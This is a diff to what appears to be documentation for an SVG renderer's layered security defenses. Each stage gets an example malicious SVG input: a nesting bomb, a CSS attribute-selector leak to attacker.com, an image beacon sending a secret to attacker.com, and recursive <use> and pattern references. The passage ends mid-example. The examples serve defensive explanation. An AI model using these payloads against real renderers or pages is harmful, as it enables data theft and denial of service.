@@ -44,19 +44,40 @@ flowchart TD
     class WARN1,WARN2,WARN3,WARN4,WARN5 warn;
 ```
 
-- **XML input validation** (Stage 1 — Parse) — blocks XXE and entity-expansion
-bombs, and limits nesting depth and element count during tokenization.
-- **CSS injection guard** (Stage 2 — Style) — blocks injected SVG `<style>`
-from reading host-document data via attribute selectors + `url()` .
-- **URL allowlist** (Stage 3 — Fetch) — rejects untrusted schemes/origins
-(SSRF via `<image>`/`@import`/`@font-face`, `file://`, tracking) before any
-request leaves the process; audits the image-decode FFI.
-- **Expansion & geometry limits** (Stage 4 — Build) — limits `<use>` fan-out
-and extreme `viewBox`, blur, path, and stroke values before the render tree
-is built.
-- **Render safety guard** (Stage 5 — Render) — validates geometry and text and
-limits self-referencing patterns before drawing, so crafted input can't
-crash the renderer or execute code.
+### XML input validation (Stage 1 — Parse)
+Blocks XXE and entity-expansion bombs, and limits nesting depth and element count during tokenization.
+**Example:**
+```svg
+<svg><g><g><g> <!-- …100,000 nested <g>… --> </g></g></g></svg>
+```
 
+### CSS injection guard (Stage  2 — Style)
+Blocks injected SVG `<style>` from reading host-document data via attribute selectors + `url()` .
+**Example:**
+```svg
+<svg><style>
+  input[value^="a"] { background: url(https://attacker.com/?v=a); }
+</style></svg>
+```
 
----
+### URL allowlist (Stage  3 — Fetch) 
+Rejects untrusted schemes/origins (SSRF via `<image>`/`@import`/`@font-face`, `file://`, tracking) before any request leaves the process; audits the image-decode FFI.
+**Example:**
+```svg
+<svg><image href="https://attacker.com/collect?d=SECRET" width="1" height="1"/></svg>
+```
+
+### Expansion & geometry limits (Stage  4 — Build) 
+Limits `<use>` fan-out and extreme `viewBox`, blur, path, and stroke values before the render tree is built.
+**Example:**
+```svg
+<svg><g id="l1"><use href="#l2"/></g><g id="l2"><use href="#l1"/></g></svg>
+```
+
+### Render safety guard (Stage  5 — Render)
+Validates geometry and text and limits self-referencing patterns before drawing, so crafted input can't crash the renderer or execute code.
+
+**Example:**
+```svg
+<svg><pattern id="p" width="10" height="10"><rect width="10" height="10" fill="url(#p)"/></pattern>
+<rect
